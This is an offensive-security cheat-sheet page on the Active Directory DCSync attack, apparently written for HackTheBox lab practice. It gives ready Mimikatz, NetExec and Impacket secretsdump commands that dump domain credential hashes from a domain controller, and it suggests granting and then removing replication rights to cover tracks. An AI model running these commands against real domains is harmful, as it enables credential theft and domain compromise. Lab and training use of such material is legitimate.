---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# DCSync

## TL;DR

<div align="left">

<figure><img src="../../../.gitbook/assets/dcsync_attack.png" alt=""><figcaption><p>DCSync in a nutshell!</p></figcaption></figure>

</div>

DCSync is late-phase attack that allows an attacker to **mimic a DC** and then dump `ntds.dit`. To perform this attack, we must have control over an account that has the rights to perform domain replication, aka **DCSync rights** (Figure 1):

1. `Replicating Directory Changes`
2. `Replicating Directory Changes All`
3. `Replication-Get-Changes-In-Filtered-Set` (sometimes)

{% hint style="info" %}
**Domain/Enterprise Admins** have these rights by default. If we have **`WriteDacl`**rights over an account, we can assign DCSync rights to it, execute the DCSync attack, and then remove them to attempt to cover our tracks.&#x20;

An example of this can be seen in the [privilege escalation part of the Forest box](../../../boxes/easy/forest.md#privilege-escalation).
{% endhint %}

## Windows

{% tabs %}
{% tab title="Dsacls*" %}
```powershell
dsacls "DC=domain,DC=local"
```
{% endtab %}

{% tab title="Mimikatz" %}
```powershell
mimikatz # lsadump::dcsync /domain:HTB.LOCAL /user:HTB\administrator
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
\*[dsacls](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151\(v=ws.11\)) requires an elevated command prompt.
{% endhint %}

## Linux

{% tabs %}
{% tab title="NetExec" %}
```bash
nxc smb 10.10.10.161 -u hacker -p h@ck3r! --ntds --user administrator
```
{% endtab %}

{% tab title="Impacket" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>impacket-secretsdump htb.local/hacker@10.10.10.161 -just-dc-user administrator
</strong></code></pre>
{% endtab %}
{% endtabs %}

## Practice

{% tabs %}
{% tab title="Forest (Easy)" %}
{% content-ref url="../../../boxes/easy/forest.md" %}
[forest.md](../../../boxes/easy/forest.md)
{% endcontent-ref %}
{% endtab %}

{% tab title="Sauna (Easy)" %}
{% content-ref url="../../../boxes/easy/sauna.md" %}
[sauna.md](../../../boxes/easy/sauna.md)
{% endcontent-ref %}
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="DCSync" %}
{% embed url="https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection" %}
A great article about the DCSync attack.
{% endembed %}
{% endtab %}

{% tab title="Secretsump" %}
{% embed url="https://www.youtube.com/watch?v=QfyZQDyeXjQ" %}
How Secretsdump script work behind the scenes!
{% endembed %}
{% endtab %}
{% endtabs %}
